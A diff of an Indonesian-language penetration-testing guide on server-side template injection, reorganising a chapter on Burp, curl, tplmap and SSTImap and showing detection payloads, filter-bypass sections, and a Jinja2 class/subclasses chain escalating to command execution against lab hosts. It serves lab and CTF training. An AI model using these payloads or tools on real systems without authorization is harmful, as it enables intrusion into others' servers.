-Gunakan `tplmap` ketika manual detection sudah menunjukkan kemungkinan SSTI dan kamu ingin mengotomasi fingerprinting/exploitation pada lab.
-
----
-
-## Install
-
-Pada Parrot OS:
-
-```bash
-git clone https://github.com/epinna/tplmap.git
-cd tplmap
-python3 -m venv .venv
-source .venv/bin/activate
-pip install -r requirements.txt
-```
-
-Jika dependency legacy bermasalah, jangan langsung merusak system Python. Gunakan virtual environment.
+> **Prinsip dasar bagian ini:** Burp Suite, curl, dan tool automation (tplmap/SSTImap) adalah **execution/interface layer** — bukan pengganti methodology. Urutan berpikir tetap:
+> 
+> ```text
+> OBSERVE → IDENTIFY → HYPOTHESIZE → TEST → OBSERVE RESPONSE → VALIDATE → CONFIDENCE → DECIDE → NEXT ACTION
+> ```
+> 
+> Pada web application pentest yang realistis, alur interaksi HTTP biasanya:
+> 
+> ```text
+> Browser → Burp Proxy → HTTP History → Burp Repeater → (Burp Intruder bila perlu)
+> ```
+> 
+> `curl` / Bash / Python tetap dipakai untuk CLI reproduction, scripting, dan automation. `tplmap` / `SSTImap` tetap dipakai untuk specialized automated fingerprinting. Tidak ada satu tool yang menggantikan tool lain — masing-masing dipilih berdasarkan kebutuhan (lihat [11.10 Tool Decision Guide](#1110-tool-decision-guide)).
 
 ---
 
-## Basic Usage
+# 11.1 Request Acquisition
 
-Contoh konsep:
+### 📌 Kapan Digunakan
 
-```bash
-python3 tplmap.py -u 'http://10.10.10.10/?name=INJECT'
-```
-
-Parameter yang diuji harus memang berada pada endpoint yang menerima input.
+Gunakan tahap ini di awal setiap engagement/lab, sebelum payload SSTI apa pun ditembakkan. Tujuannya: bekerja dari **real captured HTTP request**, bukan hanya endpoint contoh yang ditebak manual.
 
 ---
 
-## POST
+## Kenapa Ini Penting
 
-```bash
-python3 tplmap.py \
-  -u 'http://10.10.10.10/search' \
-  --data 'q=INJECT'
-```
-
----
-
-## Output Interpretation
-
-Perhatikan:
+Titik injeksi SSTI tidak selalu berada di tempat yang jelas seperti `GET /search?q=...`. Titik injeksi dapat berada pada:
 
 ```text
-[+] SSTI detected
-[+] Engine identified
-[+] Injection point
-[+] Available functionality
+query parameter
+POST form
+JSON body
+nested JSON
+XML
+multipart/form-data
+header (User-Agent, Referer, custom header)
+path component
+filename / file metadata
+field aplikasi yang terhubung ke template (nama profil, subjek email, dsb.)
 ```
 
-Jangan hanya membaca:
+Payload contoh di dokumen ini (`?q={{7*7}}`) hanyalah representasi generik. Titik injeksi sebenarnya baru diketahui setelah request asli ditangkap dan diperiksa.
+
+---
+
+## Alur Acquisition
 
 ```text
-Potential SSTI
+Browser interaction
+      ↓
+Burp Proxy
+      ↓
+HTTP History
+      ↓
+Suspected reflection/rendering point
+      ↓
+Send to Repeater
 ```
 
-Konfirmasi manual tetap penting.
+Langkah praktis:
+
+1. Arahkan browser melalui Burp Proxy (127.0.0.1:8080 secara default).
+2. Jelajahi aplikasi secara normal — isi form, ubah profil, upload file, trigger fitur yang menghasilkan output berbasis template (email, laporan, halaman hasil pencarian, dsb).
+3. Buka **HTTP History**, cari request yang parameternya kemungkinan dirender oleh template engine.
+4. Kirim request tersebut ke **Repeater** untuk baseline dan mutasi terkontrol (lihat [11.3](#113-burp-repeater)).
+
+**STOP:** Jika belum ada request nyata yang tertangkap, jangan menebak endpoint dari dokumentasi ini secara membabi buta — cari dulu titik refleksi yang sesungguhnya di aplikasi target.
 
 ---
 
-# 11.2 SSTImap
+# 11.2 Burp Proxy & HTTP History
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
-Gunakan SSTImap sebagai alternatif modern untuk automated SSTI detection dan exploitation testing pada lab.
-
----
-
-## Install
-
-Contoh:
-
-```bash
-git clone https://github.com/vladko312/SSTImap.git
-cd SSTImap
-python3 -m venv .venv
-source .venv/bin/activate
-pip install -r requirements.txt
-```
+Gunakan Proxy + HTTP History untuk menangkap request asli dan memahami struktur permintaan sebelum melakukan modifikasi apa pun.
 
 ---
 
-## Basic Usage
+## Yang Perlu Diperiksa di HTTP History
 
-Contoh umum:
-
-```bash
-python3 sstimap.py -u 'http://10.10.10.10/?q=INJECT'
-```
-
-Untuk POST:
-
-```bash
-python3 sstimap.py \
-  -u 'http://10.10.10.10/search' \
-  --data 'q=INJECT'
-```
-
----
-
-## tplmap vs SSTImap
-
-|Feature|tplmap|SSTImap|
-|---|---|---|
-|SSTI detection|Ya|Ya|
-|Engine identification|Ya|Ya|
-|Automation|Ya|Ya|
-|Legacy ecosystem|Lebih kuat|Lebih modern|
-|Lab exploitation|Ya|Ya|
-|Manual confirmation|Tetap diperlukan|Tetap diperlukan|
-
-Tool automation:
+HTTP History dipakai untuk:
 
 ```text
-accelerates testing
+menemukan injection point
+melihat endpoint sebenarnya
+melihat HTTP method (GET/POST/PUT)
+melihat parameter (query, body, JSON)
+melihat cookie / session
+melihat authorization header
+melihat CSRF token
+melihat custom header
+memahami struktur request secara keseluruhan
 ```
 
-bukan:
+Semua detail ini penting karena payload SSTI yang dikirim ulang lewat Repeater atau curl **harus** menyertakan context yang sama (cookie, token, header) — kalau tidak, response bisa berbeda bukan karena SSTI, tapi karena request tidak valid/authenticated.
+
+**STOP:** Kalau CSRF token atau session cookie berubah tiap request, catat mekanismenya dulu sebelum mulai payload mutation — response yang berbeda karena token invalid bisa disalahartikan sebagai signal SSTI.
+
+---
+
+# 11.3 Burp Repeater
+
+### 📌 Kapan Digunakan
+
+Repeater adalah tempat utama untuk **manual controlled mutation** — mengubah satu hal, mengamati satu perubahan. Ini adalah alat interaktif utama untuk detection, discriminator testing, engine-specific payload, filter bypass, dan validasi.
+
+---
+
+## Repeater Workflow
 
 ```text
-replaces understanding
+Capture Request (dari Proxy/HTTP History)
+      ↓
+Send to Repeater
+      ↓
+Baseline
+      ↓
+Controlled Payload Mutation
+      ↓
+Response Analysis
+      ↓
+Interactive Decision Guide
 ```
 
 ---
 
-# 11.3 Manual Testing dengan curl
+## Baseline — WAJIB Sebelum Payload Apa Pun
 
-### ðŸ“Œ Kapan Digunakan
+Sebelum mengirim payload SSTI, kirim dulu request dengan nilai normal dan catat:
 
-Gunakan `curl` untuk menguji satu payload secara cepat tanpa membuka browser/Burp.
+```text
+HTTP status
+response length
+response body (reflection ada di mana)
+headers
+timing
+redirect behavior
+error behavior
+```
+
+Contoh baseline:
+
+```http
+GET /search?q=hello HTTP/1.1
+Host: target.htb
+```
+
+Tanpa baseline, perubahan response setelah payload sulit diinterpretasikan — kamu tidak tahu apakah perubahan itu memang disebabkan oleh payload atau sudah ada sebelumnya.
+
+---
+
+## Controlled Mutation
+
+Ubah **satu variabel** setiap kali, lalu bandingkan terhadap baseline. Contoh progresi:
+
+```text
+Request A (baseline):  q=hello
+Request B (detection): q={{7*7}}
+Request C (discriminator): q={{7*'7'}}
+Request D (alt syntax): q=${7*7}
+```
+
+```text
+ubah satu hal
+      ↓
+observasi satu perubahan
+      ↓
+lebih mudah menginterpretasikan evidence
+```
+
+Repeater sangat cocok untuk pola ini karena request sebelumnya tetap tersimpan sehingga perbandingan side-by-side mudah dilakukan. `curl` tetap bisa dipakai untuk mereproduksi request yang sama dari terminal (lihat [11.6](#116-cli-reproduction-dengan-curl)) — bukan pengganti Repeater, melainkan cara lain menjalankan request yang sama.
+
+**STOP:** Reflection saja (`{{7*7}}` muncul apa adanya di response) belum berarti SSTI — itu baru bukti input direfleksikan, belum bukti expression dievaluasi.
+
+---
+
+## Format Ringkas per Engine (Burp Repeater)
+
+Untuk setiap engine (Jinja2, Twig, Smarty, Freemarker, Velocity, ERB, Tornado, dst — lihat Bagian 2–9), langkah Repeater-nya mengikuti pola yang sama:
+
+```text
+1. Capture request.
+2. Send to Repeater.
+3. Replace injection parameter dengan payload engine-specific.
+4. Send.
+5. Compare response terhadap baseline.
+6. Catat evidence (status, length, body, error) di catatan pengujian.
+```
+
+CLI equivalent (curl) untuk masing-masing payload tetap tersedia di setiap bagian engine — dua-duanya menguji hal yang sama, hanya interface yang berbeda.
+
+---
+
+# 11.4 Burp Intruder
+
+### 📌 Kapan Digunakan
+
+Gunakan Intruder ketika kamu perlu menguji **banyak variasi payload secara terkontrol** — bukan untuk exploitation langsung. Cocok untuk:
+
+```text
+multiple detection payloads (berbagai syntax engine sekaligus)
+engine fingerprinting payloads
+filter bypass variations
+repetitive injection point testing
+```
+
+---
+
+## Contoh Payload List (Detection Sweep)
+
+```text
+{{7*7}}
+{{7*'7'}}
+${7*7}
+{7*7}
+<%= 7*7 %>
+#set($x=7*7)$x
+```
+
+## Yang Diperhatikan di Hasil
+
+```text
+Payload position
+Payload list
+HTTP status per request
+Response length per request
+Response body diff / marker
+Timing (untuk time-based/blind indicator)
+```
+
+## Urutan yang Disiplin
+
+```text
+Detection first
+Fingerprint second
+Exploit third
+```
+
+**STOP:** Jangan menembakkan ratusan payload RCE lewat Intruder sebagai default action — Intruder untuk _variation testing yang terkontrol_, bukan brute force exploitation tanpa hipotesis.
+
+---
+
+# 11.5 OOB Testing (Collaborator / Interactsh)
+
+### 📌 Kapan Digunakan
+
+Gunakan out-of-band (OOB) testing ketika expression tampak dievaluasi tapi **tidak ada output langsung** di response (blind SSTI).
+
+---
+
+## Alur
+
+```text
+Request
+      ↓
+Burp Repeater (atau curl)
+      ↓
+Controlled payload dengan callback URL
+      ↓
+Burp Collaborator / Interactsh / controlled callback server
+      ↓
+Cek apakah ada interaksi masuk (DNS/HTTP)
+```
+
+## Decision Logic
+
+```text
+No visible output di response
+      ↓
+Apakah ada observable timing/error behavior?
+   ├─ YES → semi-blind path (timing/error sebagai signal)
+   └─ NO
+        ↓
+      Apakah server bisa melakukan outbound interaction (HTTP/DNS)?
+        ├─ YES → gunakan OOB (Collaborator/Interactsh)
+        └─ NO  → reconsider primitive/sink yang dipakai
+```
+
+Burp Collaborator terintegrasi langsung di Repeater/Intruder (klik "Copy to clipboard" untuk mendapat domain unik, lalu cek tab Collaborator untuk interaksi masuk). Interactsh adalah alternatif open-source yang bisa dipakai lewat CLI/Python jika Collaborator tidak tersedia.
+
+**STOP:** Tidak ada interaksi masuk sama sekali setelah waktu tunggu wajar → jangan langsung simpulkan "tidak vulnerable". Periksa dulu apakah outbound traffic dari server memang diizinkan (firewall/egress filtering) sebelum menyimpulkan negatif.
+
+---
+
+# 11.6 CLI Reproduction dengan curl
+
+### 📌 Kapan Digunakan
+
+`curl` digunakan untuk mereproduksi request yang sudah diketahui, menguji cepat dari terminal, scripting, automation, retesting, dan integrasi dengan tool lain (`grep`/`sed`/`awk`/pipeline). Ini bukan metode yang "kurang profesional" dibanding Burp — keduanya melayani tujuan yang berbeda: Burp untuk analisis interaktif, curl untuk reproduksi CLI dan automation.
+
+`curl` berguna untuk:
+
+```text
+reproducing known request
+quick test dari terminal
+parameterized testing
+shell scripting
+automation
+CTF
+retesting
+saving output
+chaining dengan grep/sed/awk
+integrasi dengan script (mis. ssti_detect.sh)
+```
 
 ---
 
@@ -3259,7 +3436,7 @@ Manual:
 curl 'http://10.10.10.10/search?q=%7B%7B7%2A7%7D%7D'
 ```
 
-Lebih aman menggunakan:
+Lebih aman menggunakan `--data-urlencode` karena `curl` menangani encoding secara otomatis dan menghindari kesalahan escaping manual:
 
 ```bash
 curl -G \
@@ -3267,130 +3444,20 @@ curl -G \
   'http://10.10.10.10/search'
 ```
 
-karena `curl` menangani encoding.
+**Catatan quoting:** ketika payload mengandung kombinasi `' " $ \` `` ` ``, selalu bungkus payload dalam single quote (`'...'`) agar shell tidak melakukan expansion terhadap `$` atau backtick. Jika payload itu sendiri mengandung single quote (mis. `{{7*'7'}}`), gunakan `--data-urlencode` (bukan menempelkannya langsung di URL) agar `curl` yang menangani escaping, bukan shell:
 
----
-
-# 11.4 Burp Suite untuk SSTI
-
-### ðŸ“Œ Kapan Digunakan
-
-Gunakan Burp ketika endpoint mempunyai banyak parameter atau kamu perlu membandingkan response secara cepat.
-
----
-
-## Repeater Workflow
-
-```text
-Capture Request
-      |
-      v
-Send to Repeater
-      |
-      v
-Baseline
-      |
-      v
-{{7*7}}
-      |
-      v
-Compare Response
-      |
-      v
-{{7*'7'}}
-      |
-      v
-Engine Identification
-      |
-      v
-Information Disclosure
-      |
-      v
-RCE validation
+```bash
+curl -sG 'http://10.10.10.10/search' \
+  --data-urlencode "q={{7*'7'}}"
 ```
 
 ---
 
-## Baseline
+# 11.7 Script `ssti_detect.sh`
 
-```http
-GET /search?q=hello HTTP/1.1
-Host: target.htb
-```
+### 📌 Kapan Digunakan
 
-Catat:
-
-```text
-Status
-Length
-Reflection
-Response body
-Headers
-Timing
-```
-
----
-
-## Test 1
-
-```http
-GET /search?q={{7*7}} HTTP/1.1
-Host: target.htb
-```
-
----
-
-## Test 2
-
-```http
-GET /search?q={{7*%277%27}} HTTP/1.1
-Host: target.htb
-```
-
-Bandingkan.
-
----
-
-## Intruder
-
-Gunakan Intruder untuk detection payload:
-
-```text
-{{7*7}}
-{{7+7}}
-${7*7}
-{7*7}
-<%=7*7%>
-#set($x=7*7)$x
-```
-
-Perhatikan:
-
-```text
-HTTP status
-response length
-body diff
-keyword
-latency
-```
-
-Jangan langsung memasukkan ratusan RCE payload.
-
-Urutan lebih efisien:
-
-```text
-Detection first
-Fingerprint second
-Exploit third
-```
-
----
-
-# 11.5 Script `ssti_detect.sh`
-
-### ðŸ“Œ Kapan Digunakan
-
-Gunakan script ini untuk melakukan **detection/fingerprinting otomatis** terhadap satu GET parameter. Script sengaja tidak menjalankan OS command; tahap RCE tetap manual dalam lab.
+Gunakan script ini untuk melakukan **detection/fingerprinting otomatis** terhadap satu GET parameter, sebagai pelengkap CLI dari alur manual di Repeater. Script sengaja tidak menjalankan OS command; tahap RCE tetap manual dalam lab.
 
 ## Script
 
@@ -3533,9 +3600,8 @@ test_payload() {
             ;;
     esac
 
-    # Show a small response sample
-    echo "$response" | head -c 220 | tr '
-' ' '
+    # Show a small response sample (newlines collapsed to spaces)
+    echo "$response" | head -c 220 | tr '\n' ' '
     echo
 }
 
@@ -3645,7 +3711,7 @@ false positive
 Contoh:
 
 ```text
-{{7*7}} â†’ 49
+{{7*7}} → 49
 ```
 
 dapat cocok terhadap beberapa engine.
@@ -3654,25 +3720,189 @@ Karena itu workflow sebenarnya:
 
 ```text
 Scanner
- â†“
+ ↓
 Candidate
- â†“
-Manual discriminator
- â†“
+ ↓
+Manual discriminator (Burp Repeater atau curl)
+ ↓
 Stack trace
- â†“
+ ↓
 Framework fingerprint
- â†“
+ ↓
 Confirmed engine
+```
+
+**STOP:** Output scanner mengatakan "detected" untuk lebih dari satu engine sekaligus (mis. Jinja2 dan Twig) → jangan pilih salah satu secara acak. Kembali ke discriminator test manual sebelum melanjutkan.
+
+---
+
+# 11.8 tplmap
+
+### 📌 Kapan Digunakan
+
+Gunakan `tplmap` ketika manual detection sudah menunjukkan kemungkinan SSTI dan kamu ingin mengotomasi fingerprinting/exploitation pada lab.
+
+---
+
+## Install
+
+Pada Parrot OS:
+
+```bash
+git clone https://github.com/epinna/tplmap.git
+cd tplmap
+python3 -m venv .venv
+source .venv/bin/activate
+pip install -r requirements.txt
+```
+
+Jika dependency legacy bermasalah, jangan langsung merusak system Python. Gunakan virtual environment.
+
+---
+
+## Basic Usage
+
+Contoh konsep:
+
+```bash
+python3 tplmap.py -u 'http://10.10.10.10/?name=INJECT'
+```
+
+Parameter yang diuji harus memang berada pada endpoint yang menerima input.
+
+---
+
+## POST
+
+```bash
+python3 tplmap.py \
+  -u 'http://10.10.10.10/search' \
+  --data 'q=INJECT'
 ```
 
 ---
 
-# Bagian 12 â€” SSTI Filter Bypass
+## Output Interpretation
+
+Perhatikan:
+
+```text
+[+] SSTI detected
+[+] Engine identified
+[+] Injection point
+[+] Available functionality
+```
+
+Jangan hanya membaca:
+
+```text
+Potential SSTI
+```
+
+Konfirmasi manual (Repeater atau curl) tetap penting.
+
+---
+
+# 11.9 SSTImap
+
+### 📌 Kapan Digunakan
+
+Gunakan SSTImap sebagai alternatif modern untuk automated SSTI detection dan exploitation testing pada lab.
+
+---
+
+## Install
+
+Contoh:
+
+```bash
+git clone https://github.com/vladko312/SSTImap.git
+cd SSTImap
+python3 -m venv .venv
+source .venv/bin/activate
+pip install -r requirements.txt
+```
+
+---
+
+## Basic Usage
+
+Contoh umum:
+
+```bash
+python3 sstimap.py -u 'http://10.10.10.10/?q=INJECT'
+```
+
+Untuk POST:
+
+```bash
+python3 sstimap.py \
+  -u 'http://10.10.10.10/search' \
+  --data 'q=INJECT'
+```
+
+---
+
+## tplmap vs SSTImap
+
+|Feature|tplmap|SSTImap|
+|---|---|---|
+|SSTI detection|Ya|Ya|
+|Engine identification|Ya|Ya|
+|Automation|Ya|Ya|
+|Legacy ecosystem|Lebih kuat|Lebih modern|
+|Lab exploitation|Ya|Ya|
+|Manual confirmation|Tetap diperlukan|Tetap diperlukan|
+
+Tool automation:
+
+```text
+accelerates testing
+```
+
+bukan:
+
+```text
+replaces understanding
+```
+
+---
+
+# 11.10 Tool Decision Guide
+
+### 📌 Kapan Digunakan
+
+Gunakan tabel ini untuk memilih interface berdasarkan kebutuhan pada langkah tertentu — bukan berdasarkan asumsi bahwa satu tool selalu lebih baik dari yang lain.
+
+|Situation|Preferred Interface|Alternative|
+|---|---|---|
+|Capture real request|Burp Proxy|Browser DevTools|
+|Inspect request history|Burp HTTP History|curl logs|
+|Manual SSTI testing|Burp Repeater|curl|
+|Compare payload behavior|Repeater / Comparer|curl + diff|
+|Many controlled payload variations|Intruder|Bash/Python loop|
+|OOB validation|Collaborator|Interactsh|
+|Quick CLI reproduction|curl|Repeater|
+|Automated SSTI fingerprinting|SSTImap / tplmap|custom script (ssti_detect.sh)|
+|Complex scripting / chaining|Python/Bash|Burp extensions|
+|Final reproducible PoC|curl / raw HTTP request|Burp request (exported)|
+
+Tabel ini tidak memberi ranking "mana yang terbaik" — pemilihan tool selalu berdasarkan use case saat itu. Hubungannya dengan Interactive Decision Guide (Bagian belakang dokumen):
+
+```text
+Interactive Decision Guide  =  "APA yang harus saya lakukan selanjutnya?"
+Tool Decision Guide         =  "APA yang saya pakai untuk melakukannya?"
+```
+
+Keduanya saling melengkapi, tapi tetap terpisah — Interactive Decision Guide adalah reasoning engine, Tool Decision Guide adalah pemilihan interface.
+
+---
+
+# Bagian 12 — SSTI Filter Bypass
 
 # 12.1 Encoding Bypass
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
 Gunakan ketika input filter/WAF mengubah atau menolak karakter tertentu tetapi parser template masih mungkin menerima representasi encoded.
 
@@ -3762,7 +3992,7 @@ Tanpa decoding stage di server, ia hanya tetap menjadi string.
 
 # 12.2 String Concatenation Bypass
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
 Gunakan ketika blacklist mencari keyword lengkap seperti:
 
@@ -3834,7 +4064,7 @@ class
 
 # 12.3 Attribute Access Bypass
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
 Gunakan ketika:
 
@@ -3898,7 +4128,7 @@ same object
 
 # 12.4 Blacklist Bypass
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
 Gunakan ketika filter hanya melakukan substring matching.
 
@@ -3971,16 +4201,16 @@ gunakan object configuration sebagai alternate source terhadap informasi yang di
 Yang penting untuk dipahami:
 
 ```text
-Blacklist â‰  sandbox
+Blacklist ≠ sandbox
 ```
 
 ---
 
-# Bagian 13 â€” Context Injection
+# Bagian 13 — Context Injection
 
 # 13.1 SSTI dalam HTML Context
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
 Gunakan ketika input dimasukkan ke halaman HTML melalui server-side template rendering.
 
@@ -4013,7 +4243,7 @@ Expected:
 
 # 13.2 SSTI dalam URL Parameter
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
 Ini biasanya entry point paling mudah karena GET parameter langsung terlihat.
 
@@ -4054,7 +4284,7 @@ curl -s \
 
 # 13.3 SSTI dalam Header
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
 Gunakan ketika server memasukkan header ke template, misalnya:
 
@@ -4119,7 +4349,7 @@ SSTI
 
 # 13.4 SSTI dalam File Name/Upload
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
 Gunakan ketika application processing membuat template dari:
 
@@ -4166,7 +4396,7 @@ Nama file yang hanya ditampilkan sebagai string bukan SSTI.
 
 ---
 
-# Bagian 14 â€” Decision Tree
+# Bagian 14 — Decision Tree
 
 ## Master SSTI Decision Tree
 
@@ -4292,26 +4522,26 @@ ERROR RESPONSE
 | Read error / stack trace    |
 +-----------------------------+
       |
-      +-- jinja2.exceptions.* â†’ Jinja2
+      +-- jinja2.exceptions.* → Jinja2
       |
-      +-- Twig\Error\* â†’ Twig
+      +-- Twig\Error\* → Twig
       |
-      +-- Smarty* â†’ Smarty
+      +-- Smarty* → Smarty
       |
-      +-- freemarker.* â†’ Freemarker
+      +-- freemarker.* → Freemarker
       |
-      +-- org.apache.velocity â†’ Velocity
+      +-- org.apache.velocity → Velocity
       |
-      +-- Ruby/ERB/ActionView â†’ ERB
+      +-- Ruby/ERB/ActionView → ERB
       |
-      +-- tornado.* â†’ Tornado
+      +-- tornado.* → Tornado
       |
-      +-- Handlebars/prototype â†’ Handlebars
+      +-- Handlebars/prototype → Handlebars
 ```
 
 ---
 
-# Bagian 15 â€” Common Errors & Troubleshooting
+# Bagian 15 — Common Errors & Troubleshooting
 
 |#|Error / Kondisi|Sebab|Solusi|
 |--:|---|---|---|
@@ -4408,66 +4638,66 @@ Apakah response berubah?
 
 ---
 
-# SSTI Workflow â€” From Zero to RCE
+# SSTI Workflow — From Zero to RCE
 
 ```text
-â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
-â”‚ 1. FIND INPUT                 â”‚
-â”‚ GET / POST / Header / Upload  â”‚
-â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
-                â”‚
+┌───────────────────────────────
+│ 1. FIND INPUT                 │
+│ GET / POST / Header / Upload  │
+└───────────────┬───────────────┘
+                │
                 v
-â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
-â”‚ 2. REFLECTION TEST             â”‚
-â”‚ normal text â†’ response         â”‚
-â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
-                â”‚
+┌───────────────────────────────
+│ 2. REFLECTION TEST             │
+│ normal text → response         │
+└───────────────┬───────────────┘
+                │
                 v
-â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
-â”‚ 3. UNIVERSAL DETECTION         â”‚
-â”‚ {{7*7}} / ${7*7} / {7*7}      â”‚
-â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
-                â”‚
+┌───────────────────────────────
+│ 3. UNIVERSAL DETECTION         │
+│ {{7*7}} / ${7*7} / {7*7}      │
+└───────────────┬───────────────┘
+                │
                 v
-â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
-â”‚ 4. IDENTIFY ENGINE             â”‚
-â”‚ discriminator + errors         â”‚
-â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
-                â”‚
+┌───────────────────────────────
+│ 4. IDENTIFY ENGINE             │
+│ discriminator + errors         │
+└───────────────┬───────────────┘
+                │
                 v
-â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
-â”‚ 5. ENUMERATE CONTEXT           â”‚
-â”‚ config / request / data_model  â”‚
-â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
-                â”‚
+┌───────────────────────────────
+│ 5. ENUMERATE CONTEXT           │
+│ config / request / data_model  │
+└───────────────┬───────────────┘
+                │
                 v
-â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
-â”‚ 6. DETERMINE RESTRICTIONS      â”‚
-â”‚ blacklist / sandbox / context  â”‚
-â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
-                â”‚
+┌───────────────────────────────
+│ 6. DETERMINE RESTRICTIONS      │
+│ blacklist / sandbox / context  │
+└───────────────┬───────────────┘
+                │
                 v
-â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
-â”‚ 7. SELECT EXECUTION PRIMITIVE  â”‚
-â”‚ class / helper / runtime / os  â”‚
-â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
-                â”‚
+┌───────────────────────────────
+│ 7. SELECT EXECUTION PRIMITIVE  │
+│ class / helper / runtime / os  │
+└───────────────┬───────────────┘
+                │
                 v
-â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
-â”‚ 8. VALIDATE RCE                â”‚
-â”‚ id â†’ whoami â†’ pwd              â”‚
-â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
-                â”‚
+┌───────────────────────────────
+│ 8. VALIDATE RCE                │
+│ id → whoami → pwd              │
+└───────────────┬───────────────┘
+                │
                 v
-â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
-â”‚ 9. DOCUMENT                    â”‚
-â”‚ engine + payload + impact      â”‚
-â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
+┌───────────────────────────────
+│ 9. DOCUMENT                    │
+│ engine + payload + impact      │
+└───────────────────────────────┘
 ```
 
 ---
 
-# Muscle Memory â€” 60 Second SSTI Routine
+# Muscle Memory — 60 Second SSTI Routine
 
 Saat menemukan input mencurigakan:
 
@@ -4483,7 +4713,7 @@ Saat menemukan input mencurigakan:
 Jika:
 
 ```text
-{{7*7}} â†’ 49
+{{7*7}} → 49
 ```
 
 lanjut:
@@ -4516,17 +4746,17 @@ Jika perlu RCE:
 
 ```text
 object
- â†“
+ ↓
 class
- â†“
+ ↓
 mro / bases
- â†“
+ ↓
 object
- â†“
+ ↓
 subclasses
- â†“
+ ↓
 interesting class
- â†“
+ ↓
 id
 ```
 
@@ -4536,29 +4766,29 @@ id
 
 ```text
 {{7*7}}
-      â†“
+      ↓
 49
-      â†“
+      ↓
 {{7*'7'}}
-      â†“
+      ↓
 7777777
-      â†“
+      ↓
 {{config}}
-      â†“
+      ↓
 {{request}}
-      â†“
+      ↓
 {{''.__class__}}
-      â†“
+      ↓
 {{''.__class__.__mro__}}
-      â†“
+      ↓
 {{''.__class__.__mro__[1].__subclasses__()}}
-      â†“
+      ↓
 find interesting class
-      â†“
+      ↓
 id
-      â†“
+      ↓
 whoami
-      â†“
+      ↓
 pwd
 ```
 
@@ -4652,7 +4882,7 @@ Jangan:
 
 ```text
 find SSTI
-â†“
+↓
 paste RCE payload
 ```
 
@@ -4660,17 +4890,17 @@ Gunakan:
 
 ```text
 find input
-â†“
+↓
 prove evaluation
-â†“
+↓
 identify engine
-â†“
+↓
 map context
-â†“
+↓
 identify restrictions
-â†“
+↓
 choose primitive
-â†“
+↓
 prove RCE
 ```
 
@@ -4877,22 +5107,24 @@ SSTI adalah proses:
 
 ```text
 INPUT
- â†’ TEMPLATE EVALUATION
- â†’ ENGINE IDENTIFICATION
- â†’ CONTEXT ENUMERATION
- â†’ PRIMITIVE DISCOVERY
- â†’ EXECUTION
+ → TEMPLATE EVALUATION
+ → ENGINE IDENTIFICATION
+ → CONTEXT ENUMERATION
+ → PRIMITIVE DISCOVERY
+ → EXECUTION
 ```
 
 ---
 
